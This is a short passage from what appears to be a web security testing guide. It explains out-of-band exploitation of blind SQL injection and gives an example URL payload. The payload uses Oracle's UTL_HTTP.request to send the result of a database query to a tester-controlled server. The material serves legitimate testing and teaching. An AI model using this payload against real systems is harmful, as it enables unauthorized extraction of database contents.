The out-of-band exploitation technique is useful when the tester encounters a blind SQL injection situation. 

It uses DBMS functions to perform an out-of-band connection and provide the results of the injected query as part of the request to the tester’s server.

Consider the following SQL query: 
SELECT * FROM products WHERE id_product=$id_product 

Consider the request to a script that executes the query above: 
http://www.example.com/product.php?id=10


http://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.c om:80’)||(SELECT user FROM DUAL)—
In the aforementioned example, the tester is concatenating the value 10 with the result of the function UTL_HTTP.request

This Oracle function tries to connect to “testerserver” and make an HTTP GET request containing the return from the query “SELECT user FROM DUAL”
